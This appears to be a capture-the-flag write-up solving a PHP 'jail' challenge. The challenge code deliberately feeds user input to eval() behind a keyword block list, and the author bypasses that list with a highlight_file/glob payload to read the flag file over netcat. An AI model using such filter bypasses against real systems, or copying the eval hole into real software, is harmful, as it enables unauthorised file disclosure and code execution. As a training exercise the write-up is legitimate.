# Eevee Jail - 4

This time we are given a PHP jail. I wasn't familiar with this stuff lmaooo

{% tabs %}
{% tab title="jail-4.php" %}
```php
<?php

echo "========================\n";
echo "=    Eevee's Jail 4    =\n";
echo "========================\n";

echo "[+] > ";
$var = trim(fgets(STDIN));

if($var == null) die("[?] Input needed to escape this prison\n");

function filter($var) {
        if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
} else {
        echo "[!] Restricted characters has been used";
}
echo "\n";
?>
```
{% endtab %}
{% endtabs %}

Again we have some blacklisted strings:

```php
if(preg_match('/(`|include|read|flag|open|exec|pass|system|\$)/i', $var))
```

later on our input, `$var` gets passed to `eval()`&#x20;

```php
eval($var);
```

I found a writeup from a similar challenge:

{% embed url="https://blog.dornea.nu/2016/06/20/ringzer0-ctf-jail-escaping-php/" %}

It uses the `highlight_file` function that is not blacklisted. It uses `glob` to search for the file and highlights it

```php
highlight_file(glob("*txt")[0]);
```

```
❯ nc 157.180.92.15 31318

========================
=    Eevee's Jail 4    =
========================
[+] > highlight_file(glob("*txt")[0]);  
<code><span style="color: #000000">
bbct{hmm..&nbsp;so&nbsp;unpopular&nbsp;php&nbsp;function&nbsp;i&nbsp;guess?}<br /></span>
</code>
```

Flag: `bbct{hmm.. so unpopular php function i guess?}`
